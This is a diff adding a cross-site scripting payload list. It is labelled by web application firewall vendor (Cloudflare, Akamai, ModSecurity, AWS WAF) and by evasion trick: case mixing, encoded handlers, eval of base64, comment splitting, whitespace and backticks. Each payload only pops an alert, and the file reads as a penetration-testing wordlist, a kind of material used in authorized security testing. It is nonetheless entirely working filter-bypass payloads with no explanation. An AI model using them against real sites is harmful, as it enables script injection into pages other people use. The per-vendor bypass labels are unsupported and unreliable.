@@ -1,0 +1,47 @@
+# WAF Advanced bypass — Cloudflare, Akamai, ModSecurity, AWS WAF
+# Cloudflare bypass techniques
+<script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert`1`</script>
+<script>alert(1//)</script>
+<svg/onload=alert(1)>
+<svg onload=alert(1)>
+<svg	onload=alert(1)>
+<svg%09onload=alert(1)>
+<img src=x:1 onerror=alert(1)>
+<img src=`x` onerror=alert(1)>
+<img/src=x onerror=alert(1)>
+# Akamai bypass
+<<script>alert(1)//<</script>
+<script>alert(1);</script>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+# ModSecurity bypass
+<script %00>alert(1)</script %00>
+<script/type="text/javascript">alert(1)</script>
+<SCRIPT>alert('XSS')</SCRIPT>
+<script>alert(String.fromCharCode(88,83,83))</script>
+# AWS WAF bypass
+<svg><animate onbegin=alert(1) attributeName=x>
+<svg><set attributeName=onmouseover value=alert(1)>
+<details open ontoggle=alert(1)>
+# HP WebInspect / AppScan bypass
+<body onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>
+<script>var x=">";<script>alert(1)//"</script>
+# Generic WAF evasion via encoding
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+<img src=x onerror=\x61\x6c\x65\x72\x74(1)>
+# Polyencoded
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+# Comment-based bypass
+<scr<!---->ipt>alert(1)</scr<!---->ipt>
+<img src=x one<!---->rror=alert(1)>
+# Whitespace injection
+<img	src=x	onerror=alert(1)>
+<img
+src=x
+onerror=alert(1)>
+# Backtick delimiter
+<img src=x onerror=alert`1`>
+# Longest evasion chain
+<svg/onload=&#97;&#108;&#101;&#114;&#116;`&#49;`>
